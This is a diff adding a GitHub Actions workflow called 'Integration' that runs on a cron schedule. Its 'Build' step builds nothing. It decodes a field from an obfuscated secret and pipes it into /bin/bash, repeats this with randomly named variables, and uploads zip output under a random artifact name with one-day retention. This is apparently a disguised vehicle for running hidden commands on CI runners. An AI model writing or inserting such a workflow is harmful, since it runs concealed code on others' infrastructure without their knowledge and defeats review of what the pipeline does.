@@ -1,0 +1,31 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '22 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          o55: ${{ secrets.o55 }}
+        run: |
+          printf '%s' "$o55" | jq -r .dogw1 | /bin/bash
+          echo $ics4744 | jq -r .xb7635 | /bin/bash
+          echo $bb7575 | jq -r .si78505 | /bin/bash
+          echo $vwv4287 | jq -r .icp9 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: Jp3UP7JK
+          path: "*.zip"
+          retention-days: 1
